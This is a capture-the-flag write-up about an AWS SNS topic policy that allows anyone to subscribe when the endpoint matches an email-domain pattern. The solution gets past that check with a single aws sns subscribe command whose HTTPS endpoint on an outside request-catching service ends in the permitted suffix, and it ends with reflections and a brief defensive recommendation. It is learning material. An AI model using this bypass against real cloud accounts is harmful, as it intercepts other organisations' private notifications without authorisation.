# Challenge number
3

## Challenge Statement
Enable Push Notifications
We got a message for you. Can you get it?
## IAM Policy 
```
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```              
### write a short analysis about the IAM policy here
```
* What do I have access to?
Subscribe to an SNS topic
* What don't I have access to?
Modify the SNS topic permissions.
* What do I find interesting?
The policy allows unauthorized subscriptions
* etc
```

## Solution
Ran the following command to subscribe
aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint 'https://sn.requestcatcher.com/test@tbic.wiz.io'

The flag: {wiz:subscribed-successfully}

## Reflection
* What was your approach?
Attempted to subscribe to an SNS topic using available permissions.
* What was the biggest challenge?
Determining how to catch the request.
* How did you overcome the challenges?
Explored "Request Catcher" which is a tool for catching requests.
* What led to the break through?
Successfully subscribing without authentication.
* On the blue side, how can the learning be used to properly defend the important assets?
Restrict sns:Subscribe permissions to trusted users only.

